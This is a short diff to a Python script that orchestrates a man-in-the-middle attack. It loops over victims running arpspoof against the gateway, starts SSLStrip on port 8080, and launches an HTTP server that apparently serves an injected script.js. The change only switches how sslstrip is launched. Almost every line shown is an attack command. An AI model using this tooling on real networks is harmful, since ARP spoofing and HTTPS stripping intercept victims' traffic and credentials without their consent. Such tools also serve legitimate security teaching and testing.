@@ -41,7 +41,7 @@ for victim in victims:
     os.system("xterm -e arpspoof -i eth0 -t " + gateway + " " + victim + " &")
     
 # run SSLStrip on port 8080
-os.system("python sslstrip2/sslstrip.py -l 8080 &")
+os.system("xterm -hold -e 'python3 sslstrip2/sslstrip.py -l 8080' &")
 
 # start the http server for serving the script.js, in a new console
 os.system("xterm -hold -e 'python3 httpServer.py' &")
